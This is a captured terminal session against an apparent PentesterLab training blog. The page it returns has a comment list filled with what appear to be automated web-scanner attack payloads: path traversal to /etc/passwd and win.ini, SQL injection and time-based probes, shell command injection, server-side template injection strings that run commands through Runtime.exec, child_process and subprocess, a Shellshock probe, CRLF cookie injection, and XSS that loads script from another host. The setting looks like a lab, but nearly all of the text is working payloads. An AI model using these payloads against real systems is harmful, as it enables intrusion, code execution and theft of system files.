@@ -1,0 +1,477 @@
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ curl "http://10.0.2.21/post.php?id=4;%20whoami"
+
+<!-- PentesterLab --> 
+<html>
+  <head>
+    <link rel="stylesheet" id="base" href="css/default.css" type="text/css" media="screen" />
+
+    <title>PentesterLab vulnerable blog</title>
+  </head>
+  <body>
+    
+  <div id="header">
+    <div id="logo">
+      <h1><a href="index.php">My Blog</a></h1>
+    </div>
+    <div id="menu">
+      <ul>  
+        <li class="active">
+            <a href="/"> Home  |</a> 
+        </li>
+ 
+        <li>
+          <a href="/admin/">Admin</a>
+        </li>
+        </ul>
+      </div>
+    </div> 
+
+  </div>
+
+    <div id="page">
+      <div id="content">
+        
+
+  
+  <div class="block" id="block-text">
+    <div class="secondary-navigation">
+      <div class="content">
+      <h2 class="title"><a href="/post.php?id=4">RCE</a></h2><div class="inner" style="padding-left: 40px;"><p>vulnerable a XSS stored pero que no aprezca la etiqueta &lt;script&gt;        </p></div>
+
+<div class='comments'><h3>Comments: </h3>
+<ul>
+      
+        </li>
+        <li>c:/Windows/system.ini</li>
+        <li>../../../../../../../../../../../../../../../../Windows/system.ini</li>
+        <li>c:\Windows\system.ini</li>
+        <li>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\system.ini</li>
+        <li>/etc/passwd</li>
+        <li>../../../../../../../../../../../../../../../../etc/passwd</li>
+        <li>/</li>
+        <li>../../../../../../../../../../../../../../../../</li>
+        <li>c:/</li>
+        <li>c:\</li>
+        <li>WEB-INF/web.xml</li>
+        <li>WEB-INF\web.xml</li>
+        <li>/WEB-INF/web.xml</li>
+        <li>\WEB-INF\web.xml</li>
+        <li>thishouldnotexistandhopefullyitwillnot</li>
+        <li>
+   
+        </li>
+        <li>http://www.google.com/</li>
+        <li>http://www.google.com:80/</li>
+        <li>http://www.google.com</li>
+        <li>http://www.google.com/search?q=ZAP</li>
+        <li>http://www.google.com:80/search?q=ZAP</li>
+        <li>www.google.com/</li>
+        <li>www.google.com:80/</li>
+        <li>www.google.com</li>
+        <li>www.google.com/search?q=ZAP</li>
+        <li>www.google.com:80/search?q=ZAP</li>
+        <li>
+      
+        </li>
+        <li>4506024777783397347.owasp.org</li>
+        <li>http://4506024777783397347.owasp.org</li>
+        <li>https://4506024777783397347.owasp.org</li>
+        <li>https://4506024777783397347%2eowasp%2eorg</li>
+        <li>5;URL='https://4506024777783397347.owasp.org'</li>
+        <li>URL='http://4506024777783397347.owasp.org'</li>
+        <li>http://\4506024777783397347.owasp.org</li>
+        <li>https://\4506024777783397347.owasp.org</li>
+        <li>//4506024777783397347.owasp.org</li>
+        <li>
+      
+        </li>
+        <li><!--#EXEC cmd="ls /"--></li>
+        <li>"><!--#EXEC cmd="ls /"--><</li>
+        <li><!--#EXEC cmd="dir \"--></li>
+        <li>"><!--#EXEC cmd="dir \"--><</li>
+        <li>
+        
+        </li>
+        <li>0W45pz4p</li>
+        <li></li><scrIpt>alert(1);</scRipt><li></li>
+        <li>
+        </li>
+        <li>
+        </li>
+        <li>zApPX5sS</li>
+        <li>
+        </li>
+        <li>0W45pz4p</li>
+        <li></li><script>alert(1);</script><li></li>
+        <li>
+       
+        </li>
+        <li>'</li>
+        <li>
+        '</li>
+        <li>"</li>
+        <li>
+        "</li>
+        <li>;</li>
+        <li>
+        ;</li>
+        <li>'(</li>
+        <li>
+        '(</li>
+        <li>
+        </li>
+        <li>
+        </li>
+        <li>
+         AND 1=1 -- </li>
+        <li>
+         AND 1=2 -- </li>
+        <li>
+         OR 1=1 -- </li>
+        <li>
+         AND 1=2 -- </li>
+        <li>
+         OR 1=1 -- </li>
+        <li>
+        ' AND '1'='1' -- </li>
+        <li>
+        ' AND '1'='2' -- </li>
+        <li>
+        ' OR '1'='1' -- </li>
+        <li>
+        ' AND '1'='2' -- </li>
+        <li>
+        ' OR '1'='1' -- </li>
+        <li>
+         UNION ALL select NULL -- </li>
+        <li>
+        ' UNION ALL select NULL -- </li>
+        <li>
+        " UNION ALL select NULL -- </li>
+        <li>
+        ) UNION ALL select NULL -- </li>
+        <li>
+        ') UNION ALL select NULL -- </li>
+       
+        <li>
+         / sleep(15) </li>
+        <li>
+        ' / sleep(15) / '</li>
+        <li>
+        " / sleep(15) / "</li>
+        <li>
+         and 0 in (select sleep(15) ) -- </li>
+        <li>
+        ' and 0 in (select sleep(15) ) -- </li>
+        <li>
+        " and 0 in (select sleep(15) ) -- </li>
+        <li>
+         where 0 in (select sleep(15) ) -- </li>
+        <li>
+        ' where 0 in (select sleep(15) ) -- </li>
+        <li>
+        " where 0 in (select sleep(15) ) -- </li>
+        <li>
+         or 0 in (select sleep(15) ) -- </li>
+        <li>
+       
+        <li>; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- </li>
+        <li>'; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- </li>
+        <li>"; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- </li>
+        <li>); select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- </li>
+        <li>"java.lang.Thread.sleep"(15000)</li>
+        <li>
+         / "java.lang.Thread.sleep"(15000) </li>
+        <li>
+        ' / "java.lang.Thread.sleep"(15000) / '</li>
+        <li>
+        " / "java.lang.Thread.sleep"(15000) / "</li>
+        <li>
+         and exists ( select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME') -- </li>
+        <li>
+        ' and exists ( select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME') -- </li>
+        <li>
+       
+        <li>(SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual)</li>
+        <li>
+         / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) </li>
+        <li>
+        ' / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / '</li>
+        <li>
+        " / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / "</li>
+        <li>
+         and exists (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) -- </li>
+        <li>
+     
+        </li>
+        <li>case when cast(pg_sleep(15.0) as varchar) > '' then 0 else 1 end</li>
+        <li>case when cast(pg_sleep(15.0) as varchar) > '' then 0 else 1 end -- </li>
+        <li>'case when cast(pg_sleep(15.0) as varchar) > '' then 0 else 1 end -- </li>
+        <li>"case when cast(pg_sleep(15.0) as varchar) > '' then 0 else 1 end -- </li>
+        <li>
+         / case when cast(pg_sleep(15.0) as varchar) > '' then 0 else 1 end </li>
+        <li>
+     
+        </li>
+        <li>case randomblob(100000) when not null then 1 else 1 end </li>
+        <li>f4fwh4mjykezaym7vjvmnq7vkgsch89qq39orbzo9ztkjrz3h1nuhetc</li>
+        <li>case randomblob(1000000) when not null then 1 else 1 end </li>
+        <li>hizs3g7h7ng1bnwsl118fnjjwc5vrrgn4oj1ryx86rcxxp0cqig9yc52s</li>
+        <li>case randomblob(10000000) when not null then 1 else 1 end </li>
+        <li>case randomblob(100000000) when not null then 1 else 1 end </li>
+        <li>case randomblob(1000000000) when not null then 1 else 1 end </li>
+        <li>
+     
+        <li>
+         WAITFOR DELAY '0:0:15' -- </li>
+        <li>
+        ' WAITFOR DELAY '0:0:15' -- </li>
+        <li>
+        " WAITFOR DELAY '0:0:15' -- </li>
+        <li>
+        ) WAITFOR DELAY '0:0:15' -- </li>
+        <li>
+        ) ' WAITFOR DELAY '0:0:15' -- </li>
+        <li>
+        ) " WAITFOR DELAY '0:0:15' -- </li>
+        <li>
+        )) WAITFOR DELAY '0:0:15' -- </li>
+        <li>
+        )) ' WAITFOR DELAY '0:0:15' -- </li>
+        <li>
+        )) " WAITFOR DELAY '0:0:15' -- </li>
+        <li>
+        ) WAITFOR DELAY '0:0:15' (</li>
+        <li></li>
+    
+        <li>";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var="</li>
+        <li>';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='</li>
+        <li>${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}</li>
+        <li>${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\</li>
+        <li>;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));</li>
+        <li>"+response.write(455,330*264,992)+"</li>
+        <li>+response.write({0}*{1})+</li>
+        <li>response.write(455,330*264,992)</li>
+       
+        <li>cat /etc/passwd</li>
+        <li>
+        &cat /etc/passwd&</li>
+        <li>
+        ;cat /etc/passwd;</li>
+        <li>
+        "&cat /etc/passwd&"</li>
+        <li>
+        ";cat /etc/passwd;"</li>
+        <li>
+        '&cat /etc/passwd&'</li>
+        <li>
+        ';cat /etc/passwd;'</li>
+        <li>
+        &sleep 15.0&</li>
+        <li>
+        ;sleep 15.0;</li>
+        <li>
+        "&sleep 15.0&"</li>
+        <li>
+        ";sleep 15.0;"</li>
+        <li>
+        '&sleep 15.0&'</li>
+        <li>
+        ';sleep 15.0;'</li>
+        <li>type %SYSTEMROOT%\win.ini</li>
+        <li>
+        &type %SYSTEMROOT%\win.ini</li>
+        <li>
+        |type %SYSTEMROOT%\win.ini</li>
+        <li>
+        "&type %SYSTEMROOT%\win.ini&"</li>
+        <li>
+        "|type %SYSTEMROOT%\win.ini</li>
+        <li>
+        '&type %SYSTEMROOT%\win.ini&'</li>
+        <li>
+        '|type %SYSTEMROOT%\win.ini</li>
+        <li>
+        &timeout /T 15.0</li>
+        <li>
+        |timeout /T 15.0</li>
+        <li>
+        "&timeout /T 15.0&"</li>
+        <li>
+        "|timeout /T 15.0</li>
+        <li>
+        '&timeout /T 15.0&'</li>
+        <li>
+        '|timeout /T 15.0</li>
+        <li>get-help</li>
+        <li>
+        ;get-help</li>
+        <li>
+        ";get-help</li>
+        <li>
+        ';get-help</li>
+        <li>
+        ;get-help #</li>
+        <li>
+        ;start-sleep -s 15.0</li>
+        <li>
+        ";start-sleep -s 15.0</li>
+        <li>
+        ';start-sleep -s 15.0</li>
+        <li>
+        ;start-sleep -s 15.0 #</li>
+        
+        <li>zj 3904*8229 zj</li>
+        <li>zj{1280*7245}zj</li>
+        <li>zj${6643*2273}zj</li>
+        <li>zj#{3976*7235}zj</li>
+        <li>zj{#2631*8807}zj</li>
+        <li>zj{@4354*6468}zj</li>
+        <li>zj{{2545*5211}}zj</li>
+        <li>zj{{=3785*8757}}zj</li>
+        <li>zj<%=5344*4878%>zj</li>
+        <li>zj#set($x=5146*7843)${x}zj</li>
+        <li>zj<p th:text="${5345*4731}"></p>zj</li>
+        <li>zj{@math key="2204" method="multiply" operand="9374"/}zj</li>
+        <li>zj{{82290|add:32680}}zj</li>
+        <li>zj{{print "5535" "1906"}}zj</li>
+  
+        <li><#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("sleep 15") }</li>
+        <li>#set($engine="")
+#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("sleep 15"))
+#set($null=$proc.waitFor())
+${null}</li>
+        <li>{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}</li>
+        <li><%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%></li>
+        <li>#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}</li>
+        <li>{{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\")")()}}</li>
+        <li>{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("sleep 15")}}</li>
+        <li>${__import__("subprocess").check_output("sleep 15", shell=True)}</li>
+        <li>{{__import__("subprocess").check_output("sleep 15", shell=True)}}</li>
+        <li><%=%x(sleep 15)%></li>
+        <li>#{%x(sleep 15)}</li>
+        <li>{system("sleep 15")}</li>
+        <li>
+        </li>
+        <li>
+        </li>
+        <li>oyYSsxQlYBjeyxZVrTsansONxsvTosJLQimSegVGKsLDLriTQnBeWZePUugIMDOsYiDfJnnDBPCescJmNaiviRAxkLbabgPWiubGbDvOxppCEpFXqqfmlZinPTKDcMlUZBJhMiOMgjiwGFZTrQoQmdlDGvexHPFiOLFOFlJJEPEEcMVbgRAjkRfZWSBuhkpbKbcgmjsBJQaiijLqJFctHLkjUehhxDSEHpJBJDNsGJJpyJSexELFnSdXXQKmSLjvhCAgJflsuKasFNLkKOrLQtMRaLZDeBTlxKMwbheYChOGstNNjIDqPYQTXjRIIWKceClLLgunYSeSHkGyVWUifrLnZblHKRGjbVeVDSPQEUokKnvmnYPUCQFWVTQIIisxSJQChACBtKaRPJicDOgOIDkKTSWGBIKaTigjjZOhbaalnboXCYKXbKKkKUXFatSKtqgKmmWIvxJKSVtojwaRVVdTxLMbJppUbsExKwhYGdjIKtjyqIbCgSPvYSUdOjXrZXnJEXPJEKhYVZEubCWOYutfOscmqJVFEaVMIekuUFloqekNXJPaRcClGbjpXAsSYJHkEkdYPEFxMfeXsrQGlqTBBgZqQkGErrpukVWdwTZyvcsDgZvbuFxVrSZsUlruaqxjdLHkKQjUSEFVHLYqLVIMTyEuSsjMbZPUEoAumxIPRXvoOEPHkcyspYoelNMOBeRfxennZFiTnXnXDTgfGPnbQukOKeFrhKtuxDAXfROkdacdGewWLVCOQHLEdslviorSuQJJFSSAyriLUJvVvxffGuFVdElBEjFeckiTZjOfNXJWVgJCJyKTvfLxsJlEvDqfXwLdPvvCSumevgGeRZbWXEsKDeLhwoOoNpLlKClIRZjfvyEVUpiojLQZRaquTmudVMORdMesNxnnJsOdpLfFakISKqUukwIlfYdspGrhkGBjSDxonyABmhwgbJAQEuNCDOyLYKJixEnDTsreaoRHGTkYWTDVNujZKtgiODWejYlrFuGRrNdbMrCqCmRryWAoblDhqoapfgISsnLSxdpRtOhcBmCfpCRUpmtWZNuOJDTnBGUZkMGPlwgTYkequKmUXmmmieWkmxeDqaivJEmAFLIDvbSTBdkQxdPLTUvIoKKecCCYEuknSyeowBYtgpoDQxkQMSLgafXqUTHKmeyUwCjHRkKgJFlYNPLAFTQaInYocGMGIRevRILduRBCXskehKSRVLmNTWmeBYDQRcfxmYDweuBKcjNHJdWslGicfMWmuMwWhToYTxCCyeIAJHQKREoLUNUGnDrXKEWQxoMtDZFRtbZYCWeUNKcElmBJEcoOVRhsVsQCsbOEwGPEhvPMqDIultkDrtArUOkyIBGvtZFxqDlUdkZiLOWfKxnHveIxLODcTfLNbJgPADHJsINTIGxhdRClOGDIFRPTWxqhkCpyfsftyvQbdvvmLnUpaPSBRdWTXHBofeFLtsZMZpAabSmYFtvVOeKFTjYBMWoFeYnFddvYkkTNauYkGtxpYfhTKAuUOUppCnlZKtmUuOVKKwuCHgChhHeUVnJwEFKuyYUwlHwQXMDIKsuVWVwJtwcEMbrQWycsCuJRQYlkLmwHIelFbiEdjPMmmtIWZSPiPUjDlHApjRnTolBkIwPUKHEyAZqKBIDyxPgkXuUpoGWxHEVAaZKaTGOOsGtLwyUoekTSsUhGuQMUdVbopbMxIECEUHwALAWALqDlqhQyWBqygGKJnBQGTvbhTDsgyStAVWcrgJlqCaunkuOQPUOwUhaWWeTAQlSydUdqNCfstCgeAyQndeDBLwrFvCyNiXlSnZxhSFSdIHJqoaWCYettdjhjwuJERhvQokOcmJEKsULvMGudTioTwKlElkMlZtBTMivmBRXXiYecRWTmkfENUomsYDwWOSXijdgYqjwuqWlJLyKeLenCnKhxnXZkVlcmsSiCsYjfSbFqlQNykCXLbvhIKtaMMdkRcokoIHPMkHxbGSDQGyGHUWlFPLRWTJwFaZQDMuxxdOcFdXWNvSKyOymXkgnQcgpBLXusXdgOuXuBSfUoLbrtgBbYTKEVJIOHKobpVKcPRqFeJMqTdMCcsMXpcxqq</li>
+        
+        <li>ZAP</li>
+        <li>ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s
+</li>
+        <li>ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n
+</li>
+       
+        <li>Set-cookie: Tamper=c090a2f5-00c2-46c4-8760-8bb225936c88</li>
+        <li>any
+Set-cookie: Tamper=c090a2f5-00c2-46c4-8760-8bb225936c88</li>
+        <li>any?
+Set-cookie: Tamper=c090a2f5-00c2-46c4-8760-8bb225936c88</li>
+        <li>any
+Set-cookie: Tamper=c090a2f5-00c2-46c4-8760-8bb225936c88</li>
+        <li>any?
+Set-cookie: Tamper=c090a2f5-00c2-46c4-8760-8bb225936c88</li>
+        <li>any
+Set-cookie: Tamper=c090a2f5-00c2-46c4-8760-8bb225936c88
+</li>
+        <li>any?
+Set-cookie: Tamper=c090a2f5-00c2-46c4-8760-8bb225936c88
+</li>
+      
+        <li>@</li>
+        <li>+</li>
+        <li></li>
+        <li>|</li>
+        
+        <li>wpytykcvdwetkukmwstmqgexhbbvmedozgnmgx</li>
+       
+        <li>() { :;}; echo 'x-powered-by: ShellShock-Vulnerable'</li>
+        <li>() { :;}; /bin/sleep 15</li>
+      
+        <li><script src="http://10.0.2.19:36481/a557bd4d-f485-404a-bd64-1e7b43bfaa4b"></script></li>
+        <li></script><script src="http://10.0.2.19:36481/5754e0cb-3784-41bf-9849-675f6b11f06e"></li>
+        <li>" onload="var s=document.createElement(script);s.src={0};document.getElementsByTagName(head)[0].appendChild(s);" garbage="</li>
+        <li>"><img src=x onerror="var s=document.createElement(script);s.src=http://10.0.2.19:36481/1cc82a06-3c5e-4095-8f62-80f5ed332768;document.getElementsByTagName(head)[0].appendChild(s);">
+</li>
+        <li>
+        </li>
+        <li>
+        </li>
+        <li>http://10.0.2.19:36481/c53c9818-44a8-4371-8e15-87a60b7f0f0d</li>
+        <li>
+        </li>
+        <li>
+        </li>
+        <li>${759987+566467}</li>
+        <li></li>
+      
+        </li>
+        <li>93592609551717675112200999847272493084864617</li>
+        <li>00000000000000000000000000000000000000000000</li>
+        <li>11111111111111111111111111111111111111111111</li>
+        <li>99999999999999999999999999999999999999999999</li>
+        <li></li>
+       
+        </li>
+        <li>|!<>=~=>=<=*(),+-"'\/</li>
+        <li>PeysxnmUk1yagqjjDKY0E</li>
+        <li>
+        
+        </li>
+        <li>
+        "); sleep(15.0); print("</li>
+        <li>
+        '; sleep(15.0); print('</li>
+        <li>
+        0); sleep(15.0); print("</li>
+        <li>
+        '; sleep(15.0); var x='</li>
+        <li>
+        "; sleep(15.0); var x="</li>
+        <li>
+        0; sleep(15.0)</li>
+        <li>
+        zap' || sleep(15.0) && 'zap'=='zap</li>
+        <li>
+        zap" || sleep(15.0) && "zap"=="zap</li>
+        <li>
+        0 || sleep(15.0)</li>
+        <li>
+        zap') || sleep(15.0) && hex_md5('zap</li>
+        <li>
+        </li>
+        <li></li>
+        
+</ul></div> 
+     </div>
+
+      <form method="POST" action="/post_comment.php?id=4; whoami"> 
+        Title: <input type="text" name="title" / ><br/>
+        Author: <input type="text" name="author" / ><br/>
+        Text: <textarea name="text" cols="80" rows="5">
+        </textarea><br/>
+        <input type="submit" name="submit" / >
+      </form> 
+    </div>
+
+  </div>
+
+
+
+
+        <div id="footer">
+          <div class="block">
+            <p>No Copyright </p>
+          </div>
+        </div>
+        
+      </div>
+    </div>
+  </div>
+
+
+  </body>
+</html>
